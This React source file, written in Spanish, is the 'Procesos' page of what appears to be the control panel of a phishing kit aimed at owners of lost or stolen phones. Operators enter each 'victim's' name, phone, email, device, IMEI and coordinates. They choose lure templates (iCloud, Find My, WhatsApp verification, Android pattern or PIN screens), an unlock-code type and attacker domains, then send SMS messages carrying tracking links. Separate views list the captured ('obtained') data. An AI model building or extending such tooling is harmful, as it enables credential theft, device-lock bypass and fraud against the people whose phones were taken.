import { useState, useEffect, useRef } from "react";
import { useAuth } from '../../../../context/AuthContext';
import DataTable from "../../../packages/DataTable";
import processesServices from '../../../../api/http/requirements/processes';
import domainsServices from '../../../../api/http/domains/domains'
import SelectScript from "./SelectScript";
import Stats from "./Stats";
import axios from "axios";
import { EyeIcon, TrashIcon, ChatBubbleLeftRightIcon } from '@heroicons/react/24/outline'; // Asegúrate de instalar heroicons
import ModalCoordinates from "./ModalCoordinates";
import ModalDetails from './ModalDetails';
import ModalSendSMS from './ModalSendSMS';
import ModalDetailsProcess from "./ModalDetailsProcess";

const Processes = () => {
    const { user, refreshUserData } = useAuth();
    const pageName = "Procesos";
    const [error, setError] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const [columns, setColumns] = useState([]);
    const [refreshTrigger, setRefreshTrigger] = useState(0);
    const [stats, setStats] = useState({
        total: 0,
        completed: 0,
        inProcess: 0
    });

    const domainRef = useRef(null);

    const [customer, setCustomer] = useState("");
    const [victimName, setVictimName] = useState("");
    const [smsData, setSmsData] = useState({});
    const [phone, setPhone] = useState("");
    const [email, setEmail] = useState("");
    const [device, setDevice] = useState("");
    const [imeiDevice, setImeiDevice] = useState("");
    const [script, setScript] = useState("ic");
    const [unlockCode, setUnlockCode] = useState("none");

    const [linkCode, setLinkCode] = useState("");
    const [domain, setDomain] = useState("");
    const [status, setStatus] = useState("");
    const [userName, setUserName] = useState("");
    const [linkCodeDetail, setLinkCodeDetail] = useState("")

    const [latitude, setLatitude] = useState("");
    const [longitude, setLongitude] = useState("");


    const [isOpen, setIsOpen] = useState(false);
    const toggleModal = () => setIsOpen(!isOpen);
    const [isOpenDetails, setIsOpenDetails] = useState(false);
    const toggleModalDetails = () => setIsOpenDetails(!isOpenDetails)
    const [isOpenSMS, setIsOpenSMS] = useState(false);
    const toggleModalSMS = () => setIsOpenSMS(!isOpenSMS);

    const [isOpenDetailsProcess, setIsOpenDetailsProcess] = useState(false);
    const toggleModalDetailsProcess = () => setIsOpenDetailsProcess(!isOpenDetailsProcess);

    const fetchStats = async () => {
        try {
            const response = await processesServices.stats(user.username);

            // CORRECCIÓN: Pasamos un objeto nuevo con las propiedades actualizadas
            setStats({
                total: response.data.totalRequirements || 0,
                countTrue: response.data.completed || 0,
                countFalse: response.data.countFalse || 0
            });
        } catch (error) {
            console.error("Error fetching stats:", error);
            setStats({
                total: 0,
                countTrue: 0,
                countFalse: 0
            });
        }
    }

    useEffect(() => {
        fetchStats();
    }, []);

    useEffect(() => {
        // Verificamos que la referencia exista
        if (domainRef.current) {
            // Asignamos el valor actual del elemento del DOM al estado
            setDomain(domainRef.current.value);
        }
    }, []);

    // ... otros estados
    const [domainsList, setDomainsList] = useState([]); // Nuevo estado para la lista

    useEffect(() => {
        const loadDomains = async () => {
            try {
                // Asumiendo que listDomains recibe el username
                const response = await domainsServices.listDomains(user?.username);
                const domainsAssing = await domainsServices.listAssignDomain(user?.username)

                // Ajusta 'response.data' según la estructura real de tu API
                const domainsData = response.data || [];
                const assignedData = domainsAssing.data || [];
                setDomainsList([...domainsData, ...assignedData]);

                // Opcional: Establecer el primer dominio por defecto si el estado 'domain' está vacío
                if (domainsData.length > 0 && !domain) {
                    setDomain(domainsData[0].domain); // O la propiedad que contenga el string del dominio
                }
            } catch (err) {
                console.error("Error al cargar dominios:", err);
            }
        };

        if (user?.username) {
            loadDomains();
        }
    }, [user?.username]);


    const fetchTableData = async () => {
        try {
            const response = await processesServices.listProcesses(user.username);
            return response.data;
        } catch (error) {
            console.error("Error fetching autoremove data:", error);
            return [];
        }
    };

    const listObtainedUsername = async () => {
        try {
            const response = await processesServices.listObtainedUsername(user.username);
            return response.data;
        } catch (error) {
            console.error("Error fetching autoremove data:", error);
            return [];
        }
    };

    const fetchTableDetails = async (data) => {
        try {
            const response = await processesServices.listObtained(data);
            console.log(response)
            return response.data;
        } catch (error) {
            console.error("Error fetching support data:", error);
            return [];
        }
    };

    const DomainSelectCell = ({ row, user }) => {
        const [selectedDomain, setSelectedDomain] = useState(row.domain || "");
        const [listDomain, setListDomain] = useState([]);

        useEffect(() => {
            const fetchDomains = async () => {
                try {
                    const response = await domainsServices.listDomains(user?.username);
                    const domainsAssing = await domainsServices.listAssignDomain(user?.username)
                    const domainsData = response.data || [];
                    const assignedData = domainsAssing.data || [];
                    setListDomain([...domainsData, ...assignedData]);
                } catch (error) {
                    console.error("Error cargando dominios:", error);
                }
            };
            fetchDomains();
        }, [user?.username]);

        const handleChange = async (e) => {
            const newValue = e.target.value;
            setSelectedDomain(newValue);
            await processesServices.updateValue({
                username: row.username,
                domain: newValue,
                linkCode: row.linkCode
            });
        };

        return (
            <div className="flex flex-col gap-2">
                <select
                    value={selectedDomain}
                    onChange={handleChange}
                    className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                >
                    <option value="" >Seleccione un dominio</option>
                    {listDomain.map((item) => (
                        <option key={item._id || item.id} value={item.domain}>
                            {`${item.domain}/id/${row.linkCode}`}
                        </option>
                    ))}
                </select>

                {/* Etiqueta <a> que se muestra solo si hay un dominio seleccionado */}
                {selectedDomain && (
                    <a
                        href={`https://${selectedDomain}/id/${row.linkCode}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-xs text-blue-500 hover:underline px-1"
                    >
                        Visitar: {`https://${selectedDomain}/id/${row.linkCode}`}
                    </a>
                )}
            </div>
        );
    };

    useEffect(() => {
        const colmns = [
            {
                name: 'Acciones',
                cell: row => (
                    <div className="flex items-center gap-1">
                        {/* Botón Enviar SMS (Nuevo) */}
                        <button
                            onClick={() => {
                                const now = new Date();
                                setSmsData({
                                    phone: row.phone,
                                    url: `https://${row.domain}/id/${row.linkCode}`,

                                    // 1. Fecha y Hora: "25/03/2026 09:51"
                                    dateTime: now.toLocaleString('es-ES', {
                                        day: '2-digit', month: '2-digit', year: 'numeric',
                                        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
                                    }),

                                    // 2. Solo Fecha: "25/03/2026"
                                    date: now.toLocaleDateString('es-ES', {
                                        day: '2-digit', month: '2-digit', year: 'numeric'
                                    }),

                                    // 3. Solo Hora: "09:51:30"
                                    time: now.toLocaleTimeString('es-ES', {
                                        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
                                    }),

                                    device: row.device,
                                    victimName: row.victimName,
                                    customer: row.customer,
                                    imeiDevice: imeiDevice,
                                    imei: row.imeiDevice,
                                    email: row.email
                                });
                                toggleModalSMS()


                            }}
                            className="p-2 text-emerald-600 hover:bg-emerald-50 rounded-full transition-colors"
                            title="Enviar Mensaje"
                        >
                            {/* Puedes usar ChatBubbleLeftIcon o PaperAirplaneIcon */}
                            <ChatBubbleLeftRightIcon className="w-5 h-5" />
                        </button>

                        {/* Botón Eliminar (Basura) */}
                        <button
                            onClick={() => handleDelete(row._id)}
                            className="p-2 text-red-600 hover:bg-red-50 rounded-full transition-colors"
                            title="Eliminar registro"
                        >
                            <TrashIcon className="w-5 h-5" />
                        </button>
                    </div>
                ),
                ignoreRowClick: true,
                width: '100px', // Aumentamos un poco el ancho para que quepan los 3 botones cómodamente
            },
            {
                name: 'ID',
                selector: row => row.linkCode,
                sortable: true,
                width: '80px',
            },
            {
                name: 'Estado',
                cell: row => (<span className={`px-2 py-1 text-xs font-medium rounded-full ${row.status ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}`}>
                    {row.status ? 'Completado' : 'En proceso'}
                </span>
                ),
                sortable: true,
                width: '130px',
            },
            {
                name: 'Plantilla',
                selector: row => row.script,
                sortable: true,
                width: '200px',
                cell: row => {
                    const [script, setScript] = useState(row.script);

                    const OPTIONS = {
                        ic: "iCloud",
                        icFind: "iCloud Find My",
                        maps: "Mapas",
                        mapsZoom: "Mapas Zoom",
                        wappVerify: "Verificación de Whatsapp",
                        recoverPassword: "Recuperar contraseña",
                        deleteDevice: "Borrar dispositivo",
                        androidAppPattern: "Android patron",
                        androidAppNumeric: "Android númerico",
                        androidAppAlphanumeric: "Android alfanumérico"
                    };

                    // 1. Recibimos el evento 'e'
                    const handleChange = async (e) => {
                        const newValue = e.target.value; // 2. Extraemos el valor seleccionado
                        setScript(newValue); // 3. Ahora sí, actualizamos el estado local

                        await processesServices.updateValue({
                            username: row.username,
                            script: newValue,
                            linkCode: row.linkCode
                        })

                    };

                    return (
                        <select
                            value={script}
                            onChange={handleChange}
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        >
                            {Object.entries(OPTIONS).map(([value, label]) => (
                                <option key={value} value={value}>
                                    {label}
                                </option>
                            ))}
                        </select>
                    );
                }
            },
            {
                name: 'Enlace',
                selector: row => row.domain,
                sortable: true,
                width: '300px',
                cell: row => <DomainSelectCell row={row} user={user} /> // 'user' debe venir de tu contexto o props superiores
            },
            {
                name: 'Código de desbloqueo',
                cell: row => row.unlockCode,
                sortable: true,
                with: '300px',
                cell: row => {
                    const [unlockCode, setUnlockCode] = useState(row.unlockCode);

                    const OPTIONS = {
                        none: "Sin código de desbloqueo",
                        4: "Código de 4 dígitos",
                        6: "Código 6 dígitos",
                        alphanumeric: "Código alfanumérico",
                    };

                    // 1. Recibimos el evento 'e'
                    const handleChange = async (e) => {
                        const newValue = e.target.value; // 2. Extraemos el valor seleccionado
                        setUnlockCode(newValue); // 3. Ahora sí, actualizamos el estado local

                        await processesServices.updateValue({
                            username: row.username,
                            unlockCode: newValue,
                            linkCode: row.linkCode
                        })

                    };

                    return (
                        <select
                            value={unlockCode}
                            onChange={handleChange}
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        >
                            {Object.entries(OPTIONS).map(([value, label]) => (
                                <option key={value} value={value}>
                                    {label}
                                </option>
                            ))}
                        </select>
                    );
                }
            },
            {
                name: 'Cliente',
                selector: row => row.customer,
                sortable: true,
                width: '200px',
                cell: row => {
                    // Creamos un estado local solo para esta celda
                    const [localValue, setLocalValue] = useState(row.customer);

                    const handleBlur = async () => {
                        // Aquí podrías llamar a tu API para guardar el cambio cuando el usuario termine de escribir
                        await processesServices.updateValue({
                            username: row.username,
                            customer: localValue,
                            linkCode: row.linkCode
                        })
                    };

                    return (
                        <input
                            type="text"
                            value={localValue}
                            onChange={(e) => setLocalValue(e.target.value)}
                            onBlur={handleBlur} // Se dispara al salir del input
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        />
                    );
                },
            },
            {
                name: 'Nombre de la víctima',
                selector: row => row.victimName,
                sortable: true,
                width: '200px',
                cell: row => {
                    // Creamos un estado local solo para esta celda
                    const [localValue, setLocalValue] = useState(row.victimName);

                    const handleBlur = async () => {
                        // Aquí podrías llamar a tu API para guardar el cambio cuando el usuario termine de escribir
                        await processesServices.updateValue({
                            username: row.username,
                            victimName: localValue,
                            linkCode: row.linkCode
                        })
                    };

                    return (
                        <input
                            type="text"
                            value={localValue}
                            onChange={(e) => setLocalValue(e.target.value)}
                            onBlur={handleBlur} // Se dispara al salir del input
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        />
                    );
                },
            },
            {
                name: 'Número de teléfono',
                selector: row => row.phone,
                sortable: true,
                width: '200px',
                cell: row => {
                    // Creamos un estado local solo para esta celda
                    const [localValue, setLocalValue] = useState(row.phone);

                    const handleBlur = async () => {
                        // Aquí podrías llamar a tu API para guardar el cambio cuando el usuario termine de escribir
                        await processesServices.updateValue({
                            username: row.username,
                            phone: localValue,
                            linkCode: row.linkCode
                        })
                    };

                    return (
                        <input
                            type="tel" // Mantiene el teclado numérico en móviles
                            value={localValue}
                            onChange={(e) => {
                                // Reemplaza cualquier carácter que NO sea un número (0-9) por un string vacío
                                const onlyNums = e.target.value.replace(/[^0-9]/g, '');
                                setLocalValue(onlyNums);
                            }}
                            onBlur={handleBlur}
                            placeholder="Solo números..."
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        />
                    );
                },
            },
            {
                name: 'Correo electrónico',
                selector: row => row.email,
                sortable: true,
                width: '200px',
                cell: row => {
                    // Creamos un estado local solo para esta celda
                    const [localValue, setLocalValue] = useState(row.email);

                    const handleBlur = async () => {
                        // Aquí podrías llamar a tu API para guardar el cambio cuando el usuario termine de escribir
                        await processesServices.updateValue({
                            username: row.username,
                            email: localValue,
                            linkCode: row.linkCode
                        })
                    };

                    return (
                        <input
                            type="text"
                            value={localValue}
                            onChange={(e) => setLocalValue(e.target.value)}
                            onBlur={handleBlur} // Se dispara al salir del input
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        />
                    );
                },
            },
            {
                name: 'Dispositivo',
                selector: row => row.device,
                sortable: true,
                width: '200px',
                cell: row => {
                    // Creamos un estado local solo para esta celda
                    const [localValue, setLocalValue] = useState(row.device);

                    const handleBlur = async () => {
                        // Aquí podrías llamar a tu API para guardar el cambio cuando el usuario termine de escribir
                        await processesServices.updateValue({
                            username: row.username,
                            device: localValue,
                            linkCode: row.linkCode
                        })
                    };

                    return (
                        <input
                            type="text"
                            value={localValue}
                            onChange={(e) => setLocalValue(e.target.value)}
                            onBlur={handleBlur} // Se dispara al salir del input
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        />
                    );
                },
            },
            {
                name: 'Coordenadas',
                cell: row => (
                    row.latitude && row.longitude ? `${row.latitude}, ${row.longitude}` : 'No disponible'
                ),
                width: '150px'
            },
            {
                name: 'IMEI del dispositivo',
                selector: row => row.imeiDevice,
                sortable: true,
                width: '200px',
                cell: row => {
                    // Creamos un estado local solo para esta celda
                    const [localValue, setLocalValue] = useState(row.imeiDevice);

                    const handleBlur = async () => {
                        // Aquí podrías llamar a tu API para guardar el cambio cuando el usuario termine de escribir
                        await processesServices.updateValue({
                            username: row.username,
                            imeiDevice: localValue,
                            linkCode: row.linkCode
                        })
                    };

                    return (
                        <input
                            type="text"
                            value={localValue}
                            onChange={(e) => setLocalValue(e.target.value)}
                            onBlur={handleBlur} // Se dispara al salir del input
                            className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all focus:border-blue-500"
                        />
                    );
                },
            },
            {
                name: 'Fecha de creación',
                selector: row => new Date(row.createdAt).toLocaleString(),
                sortable: true,
                width: '200px', // Nota: corregido "with" a "width"
                wrap: true,     // <--- Esta es la clave para el salto de línea
                style: {
                    whiteSpace: 'normal', // Refuerza que el texto pueda romperse
                },
            }
        ];

        setColumns(colmns);
    }, []);



    const handleSubmit = async (e) => {
        e.preventDefault();

        try {

            const data = {
                customer,
                victimName,
                phone,
                email,
                device,
                imeiDevice,
                script,
                unlockCode,
                domain,
                latitude,
                longitude,
                username: user.username
            }



            setIsLoading(true);
            const response = await processesServices.addProcess(data)
            if (response.status) {
                setError("");
                setRefreshTrigger(prev => prev + 1);

            } else {
                setError(response.message || "Error al guardar el proceso");
            }

        } catch (err) {
            console.error("Error al guardar el proceso:", err);
            setError("Error al guardar el proceso");
        } finally {
            setIsLoading(false);
        }
    }



    const handleDelete = async (id) => {
        if (window.confirm("¿Estás seguro de que deseas eliminar este proceso?")) {
            try {
                const response = await processesServices.deleteProcess(id);
                if (response.status) {
                    setError("");
                    setRefreshTrigger(prev => prev + 1);
                } else {
                    setError(response.message || "Error al eliminar el proceso");
                }
            } catch (err) {
                console.error("Error al eliminar el proceso:", err);
                setError("Error al eliminar el proceso");
            }
        } else {
            // El usuario canceló la eliminación
            return;
        }
    }

    const handleDeleteObtained = async (id) => {
        if (window.confirm("¿Estás seguro de que deseas eliminar este proceso?")) {
            try {
                const response = await processesServices.deleteObtained(id);
                if (response.status) {
                    setError("");
                    setRefreshTrigger(prev => prev + 1);
                } else {
                    setError(response.message || "Error al eliminar el proceso");
                }
            } catch (err) {
                console.error("Error al eliminar el proceso:", err);
                setError("Error al eliminar el proceso");
            }
        } else {
            // El usuario canceló la eliminación
            return;
        }
    }




    return (
        <>
            {/* Se eliminó el x-data de este div */}
            <div>
                <div className="mb-6 flex flex-wrap items-center justify-between gap-3">
                    {/* Reemplazamos x-text por la variable entre llaves */}
                    <h2 className="text-xl font-semibold text-gray-800 dark:text-white/90">
                        {pageName}
                    </h2>


                    <nav>
                        <ol className="flex items-center gap-1.5">
                            <li>
                                <a className="inline-flex items-center gap-1.5 text-sm text-gray-500 dark:text-gray-400"
                                    href="index.html">
                                    Dashboard
                                    <svg className="stroke-current" width="17" height="16" viewBox="0 0 17 16" fill="none"
                                        xmlns="http://www.w3.org/2000/svg">
                                        <path d="M6.0765 12.667L10.2432 8.50033L6.0765 4.33366" stroke="" strokeWidth="1.2"
                                            strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </a>
                            </li>
                            {/* Aquí también mostramos el título en el breadcrumb */}
                            <li className="text-sm text-gray-800 dark:text-white/90">
                                {pageName}
                            </li>
                        </ol>
                    </nav>
                </div>
            </div>

            <Stats stats={stats} />



            <div className="min-h-screen rounded-2xl border border-gray-200 bg-white px-5 py-7 dark:border-gray-800 dark:bg-white/[0.03] xl:px-10 xl:py-12">
                <div className="mx-auto w-full max-w-[630px] text-center">
                    <h3 className="mb-4 text-theme-xl font-semibold text-gray-800 dark:text-white/90 sm:text-2xl">
                        Procesos en ejecución
                    </h3>
                    <p className="text-sm text-gray-500 dark:text-gray-400 sm:text-base">
                        Gestionar los procesos en ejecución.
                    </p>
                </div>


                <div className="border-t border-gray-100 px-1 py-6.5 dark:border-gray-800">
                    {error && (
                        <div className="p-3 mb-4 text-sm text-white-600 bg-red-100 rounded-lg dark:bg-red-900/30 dark:text-white-400">
                            {error}
                        </div>
                    )}

                    <form className="flex flex-col text-left" onSubmit={handleSubmit}>
                        <div className="custom-scrollbar h-[400px] overflow-y-auto px-1 space-y-7">

                            {/* Grid principal */}
                            <div className="grid grid-cols-1 gap-x-6 gap-y-5 lg:grid-cols-2">

                                {/* Input: Cliente */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Cliente</label>
                                    <input
                                        type="text"
                                        value={customer}
                                        onChange={(e) => setCustomer(e.target.value)}
                                        className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        placeholder="Nombre del cliente"
                                        required
                                    />
                                </div>

                                {/* Input: Nombre de la víctima */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Nombre de la víctima</label>
                                    <input
                                        type="text"
                                        value={victimName}
                                        onChange={(e) => setVictimName(e.target.value)}
                                        className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        placeholder="Nombre de la víctima (opcional)"
                                        required
                                    />
                                </div>

                                {/* Input: Número de teléfono */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">
                                        Número de teléfono
                                    </label>
                                    <input
                                        type="tel" // Mantiene el teclado numérico en móviles
                                        value={phone}
                                        onChange={(e) => {
                                            const val = e.target.value;
                                            // Solo permite números (la expresión regular /^\d*$/ permite vacío o dígitos)
                                            if (/^\d*$/.test(val)) {
                                                setPhone(val);
                                            }
                                        }}
                                        className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        placeholder="Ingrese el número de teléfono"
                                        required
                                    />
                                </div>

                                {/* Input: Dispositivo */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Dispositivo</label>
                                    <input
                                        type="text"
                                        value={device}
                                        onChange={(e) => setDevice(e.target.value)}
                                        className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        placeholder="Ingrese el modelo del dispositivo"
                                        required
                                    />
                                </div>

                                {/* Input: IMEI */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">IMEI del dispositivo</label>
                                    <input
                                        type="text"
                                        value={imeiDevice}
                                        onChange={(e) => setImeiDevice(e.target.value)}
                                        className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        placeholder="Ingrese el imei del dispositivo"
                                    />
                                </div>

                                {/* Input: Correo electrónico */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Correo electrónico</label>
                                    <input
                                        type="email"
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        className="h-11 w-full rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        placeholder="Ingrese el correo electrónico"
                                    />
                                </div>

                                {/* Componente: Plantilla */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Seleccione una plantilla</label>
                                    <SelectScript script={script} setScript={setScript} />
                                </div>

                                {/* Select: Código de desbloqueo */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Código de desbloqueo</label>
                                    <select
                                        className="h-11 w-full appearance-none rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        value={unlockCode}
                                        onChange={(e) => setUnlockCode(e.target.value)}
                                    >
                                        <option value="none">Sin código de desbloqueo</option>
                                        <option value="4">Código 4 dígitos</option>
                                        <option value="6">Código 6 dígitos</option>
                                        <option value="alphanumeric">Código alfanumérico</option>
                                    </select>
                                </div>

                                {/* Select: Dominio */}
                                <div>
                                    <label className="mb-1.5 block text-sm font-medium text-gray-700 dark:text-gray-400">Dominio</label>
                                    <select
                                        ref={domainRef}
                                        className="h-11 w-full appearance-none rounded-lg border border-gray-300 bg-transparent px-4 py-2.5 text-sm text-gray-800 shadow-theme-xs focus:border-blue-500 focus:ring-3 focus:ring-blue-500/10 dark:border-gray-700 dark:bg-gray-900 dark:text-white/90 outline-none transition-all"
                                        value={domain}
                                        onChange={(e) => setDomain(e.target.value)}
                                        required
                                    >
                                        <option value="" disabled>Seleccione un dominio</option>
                                        {domainsList.map((item) => (
                                            <option key={item._id || item.id} value={item.domain}>
                                                {item.domain}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                <div className="flex items-end">
                                    <button
                                        onClick={toggleModal}
                                        type="button"
                                        className="h-11 w-full rounded-lg bg-green-600 px-4 py-2.5 text-sm font-medium text-white hover:bg-green-700 transition-all disabled:bg-green-400 shadow-sm active:scale-[0.98]"
                                    >
                                        Coordenadas
                                    </button>
                                </div>

                                {/* CONTENEDOR DEL BOTÓN: Ocupa el espacio del siguiente input si es impar */}
                                <div className="flex items-end">
                                    <button
                                        type="submit"
                                        disabled={isLoading}
                                        className="h-11 w-full rounded-lg bg-blue-600 px-4 py-2.5 text-sm font-medium text-white hover:bg-blue-700 transition-all disabled:bg-blue-400 shadow-sm active:scale-[0.98]"
                                    >
                                        {isLoading ? "Guardando..." : "Guardar"}
                                    </button>
                                </div>

                            </div>
                        </div>
                    </form>


                </div>

                <ModalCoordinates
                    isOpen={isOpen}
                    setIsOpen={setIsOpen}
                    toggleModal={toggleModal}
                    user={user}
                    setRefreshTrigger={setRefreshTrigger}
                    setLatitude={setLatitude}
                    setLongitude={setLongitude}
                />


                <div className="mt-6">

                    <DataTable
                        // 5. Pasamos el refreshTrigger como key o prop si tu DataTable lo soporta
                        // Si tu DataTable no se actualiza sola al cambiar responseHttps, 
                        // usar 'key' forzará un re-render del componente completo.
                        key={refreshTrigger}
                        columns={columns}
                        responseHttps={fetchTableData}
                    />
                </div>


                {linkCodeDetail != "" && (
                    <ModalDetails
                        isOpen={isOpenDetails}
                        setIsOpen={setIsOpenDetails}
                        toggleModal={toggleModalDetails}
                        user={user}
                        setRefreshTrigger={setRefreshTrigger}
                        linkCodeDetail={linkCodeDetail}
                        setLinkCodeDetail={setLinkCodeDetail}
                        fetchTableDetails={fetchTableDetails}
                    />
                )}


                <ModalSendSMS
                    isOpen={isOpenSMS}
                    setIsOpen={setIsOpenSMS}
                    toggleModal={toggleModalSMS}
                    user={user}
                    refreshUserData={refreshUserData}
                    smsData={smsData}
                    setSmsData={setSmsData}
                />

                <ModalDetailsProcess
                    isOpen={isOpenDetailsProcess}
                    setIsOpen={setIsOpenDetailsProcess}
                    toggleModal={toggleModalDetailsProcess}
                    user={user}
                    refreshUserData={refreshUserData}
                    listObtainedUsername={listObtainedUsername}
                    fetchTableDetails={fetchTableDetails}
                    handleDeleteObtained={handleDeleteObtained}
                />
                <br />

                <div className="custom-scrollbar h-[400px] overflow-y-auto px-1 space-y-7">
                    {/* Cambiamos items-end por items-center y justify-center */}
                    <div className="grid grid-cols-1 gap-x-6 gap-y-5 lg:grid-cols-1">
                        <div className="flex items-center justify-center">
                            <button
                                onClick={toggleModalDetailsProcess}
                                type="button"
                                disabled={isLoading}
                                /* Eliminé 'w-full' para que el botón no ocupe todo el ancho 
                                   y se vea realmente centrado. Si quieres que sea ancho pero 
                                   esté centrado, deja el w-full.
                                */
                                className="h-11 px-8 rounded-lg bg-gray-600 py-2.5 text-sm font-medium text-white hover:bg-gray-700 transition-all disabled:bg-gray-400 shadow-sm active:scale-[0.98]"
                            >
                                Ver detalles
                            </button>
                        </div>
                    </div>
                </div>



            </div>


        </>
    );
};

export default Processes;